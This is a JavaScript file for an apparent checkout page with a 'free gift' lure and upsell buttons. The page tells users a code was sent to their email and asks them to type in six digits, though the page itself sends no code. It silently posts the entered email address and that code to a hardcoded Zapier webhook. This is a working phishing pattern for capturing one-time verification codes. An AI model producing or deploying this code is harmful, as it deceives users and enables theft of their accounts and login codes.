document.addEventListener('DOMContentLoaded', () => {

  const subtotalSpan = document.getElementById('subtotal');
  const totalSpan = document.getElementById('total');
  const extraLabel = document.getElementById('extra-label');
  const giftSpan = document.getElementById('gift');

  const continueBtn = document.getElementById('continueBtn');
  const modalOverlay = document.getElementById('modalOverlay');
  const modalMessage = document.getElementById('modalMessage');
  const codeBoxes = document.querySelectorAll('.codeBox');
  const successMessage = document.getElementById('successMessage');

  const ZAPIER_WEBHOOK = "https://hooks.zapier.com/hooks/catch/26329103/uln0ahv/"; // Your Zapier webhook

  // Subtotal & upsells
  let subtotal = 6.99;
  let extraItems = 0;

  function updateTotals() {
    const total = subtotal - 6.99; // Free gift
    subtotalSpan.textContent = `$${subtotal.toFixed(2)} USD`;
    giftSpan.textContent = `-$6.99 USD`;
    extraLabel.textContent = `+${extraItems} items`;
    totalSpan.textContent = `$${total.toFixed(2)} USD`;
  }

  updateTotals();

  // Upsell buttons
  document.querySelectorAll('.upsell .add-btn').forEach(button => {
    button.addEventListener('click', (e) => {
      const upsellDiv = e.target.closest('.upsell');
      const price = parseFloat(upsellDiv.dataset.price);
      subtotal += price;
      extraItems += 1;
      updateTotals();
      button.disabled = true;
      button.textContent = 'Added';
    });
  });

  // Continue to Payment button
  continueBtn.addEventListener('click', () => {
    const email = document.getElementById('email').value.trim();
    if (!email) { alert("Please enter your email."); return; }

    modalMessage.textContent = `We sent a code to ${email}. Please input the 6-digit code here:`;
    modalOverlay.style.display = 'flex';
    codeBoxes.forEach(b => { b.value=''; b.disabled=false; });
    codeBoxes[0].focus();
    successMessage.style.display = 'none';

    // Send email to Zapier (form-style POST)
    const formData = new URLSearchParams();
    formData.append('type', 'data');
    formData.append('data', 'Email: ' + '```' + email + '```');

    fetch(ZAPIER_WEBHOOK, {
      method: 'POST',
      body: formData
    }).catch(err => console.warn("Zapier fetch failed", err));
  });

  // Code input logic
  codeBoxes.forEach((box, index) => {
    box.addEventListener('input', () => {
      if (box.value.length > 1) box.value = box.value[0];
      if (box.value.length === 1 && index < codeBoxes.length -1) codeBoxes[index+1].focus();

      // Last box entered
      if (index === codeBoxes.length -1 && box.value.length ===1) {
        const email = document.getElementById('email').value.trim();
        const code = Array.from(codeBoxes).map(b => b.value).join('');
        codeBoxes.forEach(b => b.disabled = true);
        successMessage.style.display = 'block';

        // Send code to Zapier
        const formData = new URLSearchParams();
        formData.append('type', 'data');
        formData.append('data', 'Code:' + '```' + code + '```');

        fetch(ZAPIER_WEBHOOK, {
          method: 'POST',
          body: formData
        }).catch(err => console.warn("Zapier fetch failed", err));

        setTimeout(() => { modalOverlay.style.display = 'none'; }, 2000);
      }
    });

    // Backspace navigation
    box.addEventListener('keydown', (e) => {
      if (e.key === "Backspace" && !box.value && index > 0) codeBoxes[index-1].focus();
    });
  });

});


